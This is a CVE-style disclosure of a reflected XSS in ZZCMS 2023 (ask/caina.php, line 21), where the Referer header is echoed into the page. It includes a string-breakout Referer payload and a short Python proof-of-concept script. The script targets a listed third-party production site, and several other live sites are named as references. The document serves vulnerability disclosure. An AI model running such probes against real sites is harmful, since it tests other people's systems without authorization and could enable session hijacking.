# ZZCMS 2023 反射型XSS ask/caina.php

## CVE-ID

CVE-2024-44818

## Vulnerability type 

Cross Site Scripting (XSS)

## Vendor of the product(s) 

http://www.zzcms.net/about/download.html
## Affected product(s)/code base 

## Product	* Version	

ZZCMS
<=2023(latest)

## Optional

Has vendor confirmed or acknowledged the vulnerability? No

## Attack type 

Remote

Information Disclosure

## Affected component(s)

```
File: ask/caina.php
Line: 21
Vulnerable Code:
showmsg('采纳成功',$_SERVER['HTTP_REFERER']);
```



## Attack vector(s)

```
Type: Reflected Cross-Site Scripting (XSS)
Exploit: An attacker can craft a malicious URL that includes a specially crafted Referer header. When a victim clicks on this URL, the malicious script embedded in the Referer header will be executed in the context of the victim's browser.

Payload:http://127.0.0.3/ask/caina.php Post:name=还好&yzm=31&tel=18188888888  

Referer:baidu.com";alert(1);parent.location="
```



## Suggested description of the vulnerability for use in the CVE

```
A reflected cross-site scripting (XSS) vulnerability exists in ask/caina.php at line 21. The application directly inserts the value of the HTTP_REFERER header into the HTML response without proper sanitization. An attacker can exploit this vulnerability by tricking a user into visiting a specially crafted URL, which includes a malicious Referer header. This can lead to the execution of arbitrary JavaScript code in the context of the victim's browser, potentially resulting in session hijacking, defacement, or other malicious activities.
```



## Discoverer(s)/Credits 

GKDf1sh



## Reference(s) 

```
https://demo.zzcms.com
https://www.88zsw.com
http://www.818yyzs.com
https://www.qibai.cc
http://www.weixumu.cn
http://www.eshouyao.com
http://www.66988.tv/
http://www.dl580.tv/
```



## Additional information

```python
You can use hackbar to add header Referer: baidu.com";alert(1);parent.location=" ,or use python below

import requests

url = "https://www.88zsw.com/user/login.php"

headers = {
    "Referer": 'baidu.com";alert(1);parent.location="'
}

response = requests.get(url, headers=headers)

print(response.text)

if "alert(1)" in response.text:
    print("XSS yes")
```

